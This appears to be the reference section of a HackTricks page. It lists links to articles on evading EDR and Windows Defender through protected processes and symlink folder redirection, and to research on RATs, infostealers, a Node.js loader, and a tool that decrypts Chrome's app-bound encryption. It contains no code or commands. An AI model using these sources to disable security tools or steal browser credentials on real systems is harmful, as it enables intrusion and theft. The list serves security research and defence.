- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
